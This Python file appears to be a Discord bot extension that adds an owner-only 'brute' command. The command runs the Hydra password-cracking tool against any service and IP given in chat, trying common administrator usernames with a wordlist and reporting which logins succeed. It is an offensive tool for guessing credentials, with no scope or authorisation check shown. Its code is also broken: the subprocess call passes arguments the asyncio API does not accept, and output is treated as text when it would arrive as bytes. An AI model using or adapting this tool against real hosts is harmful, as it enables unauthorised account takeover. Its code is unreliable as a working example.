import shlex
import asyncio
import logging
from discord.ext import commands

logger = logging.getLogger(__name__)

class BruteForce(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def run_hydra(self, usernames, password_file, service, target_ip):
        results = []
        for username in usernames:
            command = f"hydra -l {username} -P {password_file} {service}://{target_ip}"
            args = shlex.split(command)
            try:
                process = await asyncio.create_subprocess_exec(*args, capture_output=True, text=True)
                stdout, stderr = await process.communicate()
                if "1 valid password found" in stdout:
                    results.append(f"Success: {username} - {password_file}")
                else:
                    results.append(f"Failed: {username} - {password_file}")
            except asyncio.TimeoutError:
                results.append(f"Timeout: {username} - {password_file}")
            await asyncio.sleep(1)
        return results

    @commands.command(name="brute", help="Brute force an IP using Hydra.")
    @commands.is_owner()
    async def brute(self, ctx, service: str, target_ip: str):
        try:
            usernames = ['root', 'admin', 'user', 'administrator']
            password_file = 'wordlist.txt'

            results = await self.run_hydra(usernames, password_file, service, target_ip)
            await ctx.send(f"Results:\n{'\n'.join(results)}")
        except asyncio.TimeoutError:
            await ctx.send("Timeout error occurred. Please try again later.")
        except Exception as e:
            await ctx.send("An error occurred while executing brute. Please try again later.")

async def setup(bot):
    await bot.add_cog(BruteForce(bot))
